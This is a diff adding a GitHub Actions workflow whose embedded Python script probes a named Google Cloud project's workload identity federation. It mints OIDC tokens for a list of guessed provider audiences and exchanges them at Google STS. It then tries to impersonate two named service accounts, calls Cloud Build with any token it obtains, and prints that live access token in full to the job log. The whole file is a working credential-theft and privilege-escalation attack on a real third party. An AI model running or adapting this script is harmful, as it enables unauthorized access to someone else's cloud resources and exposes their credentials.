@@ -1,0 +1,65 @@
+name: i38160-audprobe
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    steps:
+      - name: probe
+        run: |
+          python3 - <<'PY'
+          import json, os, subprocess, urllib.error, urllib.parse, urllib.request
+          AUD = [
+            "projects/381521917100/locations/global/workloadIdentityPools/github-actions/providers/gha-provider",
+            "projects/381521917100/locations/global/workloadIdentityPools/test20231104b/providers/test-provider-b",
+            "projects/381521917100/locations/global/workloadIdentityPools/github-actions/providers/github-actions",
+            "projects/381521917100/locations/global/workloadIdentityPools/github-actions/providers/github",
+            "projects/381521917100/locations/global/workloadIdentityPools/github-actions/providers/github-provider",
+            "projects/381521917100/locations/global/workloadIdentityPools/github/providers/github",
+            "projects/381521917100/locations/global/workloadIdentityPools/github/providers/github-actions",
+            "projects/381521917100/locations/global/workloadIdentityPools/gha/providers/gha",
+            "projects/381521917100/locations/global/workloadIdentityPools/github-oidc/providers/github",
+          ]
+          def req(u, data=None, token=None, timeout=40):
+              h={'Accept':'application/json','Content-Type':'application/json','User-Agent':'i38160'}
+              if token: h['Authorization']='Bearer '+token
+              if isinstance(data,(dict,list)): data=json.dumps(data).encode()
+              r=urllib.request.Request(u,data=data,headers=h)
+              try:
+                  resp=urllib.request.urlopen(r,timeout=timeout); return resp.status,resp.read().decode('utf-8','replace')
+              except urllib.error.HTTPError as e: return e.code,(e.read() or b'').decode('utf-8','replace')
+              except Exception as e: return -1,repr(e)[:200]
+          u=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); t=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          def mint(aud):
+              if not u or not t: return ''
+              uu=u+('&' if '?' in u else '?')+'audience='+urllib.parse.quote(aud,safe='')
+              out=subprocess.run(['curl','-sS','-m','30','-H','Authorization: Bearer '+t,uu],capture_output=True,text=True).stdout
+              try: return json.loads(out).get('value','')
+              except Exception: return ''
+          for aud in AUD:
+              jwt=mint(aud)
+              if not jwt:
+                  print('AUD %s jwt=EMPTY'%aud, flush=True); continue
+              st,b=req('https://sts.googleapis.com/v1/token', {'grantType':'urn:ietf:params:oauth:grant-type:token-exchange',
+                        'audience':aud,'scope':'https://www.googleapis.com/auth/cloud-platform','requestedTokenType':'urn:ietf:params:oauth:token-type:access_token',
+                        'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt','subjectToken':jwt})
+              d={}
+              try: d=json.loads(b)
+              except Exception: pass
+              print('AUD %s sts=%s err=%s tok=%s'%(aud,st,(d.get('error_description') or d.get('error') or '')[:120],bool(d.get('access_token'))), flush=True)
+              if d.get('access_token'):
+                  # try impersonating the two known SAs
+                  for sa in ['se2gha-deployer@vvakame-playground.iam.gserviceaccount.com','381521917100-compute@developer.gserviceaccount.com']:
+                      st2,b2=req('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken'%sa, {'scope':['https://www.googleapis.com/auth/cloud-platform'],'lifetime':'3600s'}, token=d['access_token'])
+                      print('  IMP %s http=%s %s'%(sa,st2,b2[:160]), flush=True)
+                      if st2==200:
+                          try: at=json.loads(b2)['accessToken']
+                          except Exception: continue
+                          st3,b3=req('https://cloudbuild.googleapis.com/v1/projects/vvakame-playground/builds?pageSize=1', token=at)
+                          print('  CLOUDBUILD http=%s %s'%(st3,b3[:160]), flush=True)
+                          print('  GOODTOKEN %s %s'%(sa,at), flush=True)
+          PY
